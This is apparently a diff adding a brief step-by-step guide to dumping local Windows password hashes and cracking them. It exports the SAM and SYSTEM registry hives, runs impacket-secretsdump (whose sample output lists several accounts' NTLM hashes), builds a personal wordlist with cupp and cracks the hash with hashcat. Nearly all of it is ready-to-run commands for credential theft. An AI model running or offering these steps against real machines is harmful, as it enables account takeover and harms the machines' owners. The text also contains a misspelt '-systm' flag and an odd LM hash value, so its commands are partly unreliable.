@@ -1,0 +1,42 @@
+
+
+1) export the sam and system files using powershell to current location:
+
+reg save HKLM\sam ./sam
+reg save HKLM\system ./system
+
+2) from kali/wsl2 (in the saved directory):
+apt update -y
+apt install python3-impacket -y
+impacket-secretsdump -sam sam -systm system LOCAL
+
+from this output:
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0x659533520adc5631da734d364ed65a48
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e9167e1cc5e42bf8f25ac321fc728fc:::
+micha:1001:aad3b435b51404eeaad3b435b51404ef:21e326d9202b2f5da565c3825abb1ba2:::
+[*] Cleaning up...
+
+
+copy the hash:
+21e326d9202b2f5da565c3825abb1ba2
+
+nano hashes.txt
+
+paste it there.
+
+
+3) brute force:
+
+apt install cupp hashcat -y
+
+create new password list with cupp by running:
+cupp -i
+
+4) in the saved location path, use this command:
+hashcat -m 1000 hashes.txt <myname>.txt
